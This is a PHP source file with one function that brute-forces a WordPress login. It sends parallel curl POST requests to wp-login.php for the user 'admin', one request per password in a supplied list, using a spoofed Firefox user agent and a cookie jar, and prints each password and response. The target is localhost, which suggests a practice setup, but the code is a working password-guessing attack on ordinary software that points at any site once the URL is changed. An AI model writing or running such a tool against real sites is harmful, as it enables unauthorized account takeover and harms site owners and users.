<?php

function queueUp($array_of_passwords) {
    //create the curl handle

    $user_agent='Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0';

    // Pick a url
    $url = 'http://127.0.0.1:8888/wp-login.php';
    $username = 'admin';
    $redirect = './wp-admin/';

    $multiCurl = [];
    $result = [];
    $mh = curl_multi_init();


      foreach($array_of_passwords as $i=>$password){

        $options = array(

            CURLOPT_CUSTOMREQUEST  =>"POST",        //set request type post or get
            CURLOPT_POST           => true,        //set to POST
            CURLOPT_USERAGENT      => $user_agent, //set user agent
            CURLOPT_COOKIEFILE     =>"cookie.txt", //set cookie file
            CURLOPT_COOKIEJAR      =>"cookie.txt", //set cookie jar
            CURLOPT_RETURNTRANSFER => true,     // return web page
            CURLOPT_HEADER         => false,    // don't return headers
            CURLOPT_FOLLOWLOCATION => true,     // follow redirects
            CURLOPT_ENCODING       => "",       // handle all encodings
            CURLOPT_AUTOREFERER    => true,     // set referer on redirect
            CURLOPT_CONNECTTIMEOUT => 120,      // timeout on connect
            CURLOPT_TIMEOUT        => 120,      // timeout on response
            CURLOPT_MAXREDIRS      => 10,       // stop after 10 redirects
            //CURLOPT_USERPWD        => $username . ":" . $password
            //CURLOPT_POSTFIELDS     => array("log"=>$username, "pwd"=>$password),

            //sets log and pwd, and includes the redirect to get through the hurdles to login to wordpress. Puts everything in the post fields.
            CURLOPT_POSTFIELDS =>'log='.urlencode($username).'&pwd='.urlencode($password).'&redirect_to='.urlencode($redirect),
            CURLOPT_URL => $url
        );

          echo '$i is ' . $i;
          echo "\n";
          echo '$password is ' . $password;
          echo "\n";
          $multiCurl[$i] = curl_init();
          curl_setopt_array( $multiCurl[$i], $options);
          curl_multi_add_handle($mh, $multiCurl[$i]);


      }

      $index = null;
      do {
        curl_multi_exec($mh, $index);
      } while($index > 0);

      //get content and then remove the handles
      foreach($multiCurl as $k => $ch){
          $result[$k] = curl_multi_getcontent($ch);
          //echo "The result is " . $result[$k];
        print_r($result);
          curl_multi_remove_handle($mh, $ch);
      }

    //close
      curl_multi_close($mh);

    
    
    // echo "the var dump is \n";
    // var_dump($mh);
    // $answer = curl_multi_info_read($mh);
    // var_dump($answer);

   // $content = curl_multi_exec( $mh, $active );
    //echo $content;

    
    return $result;

}

    


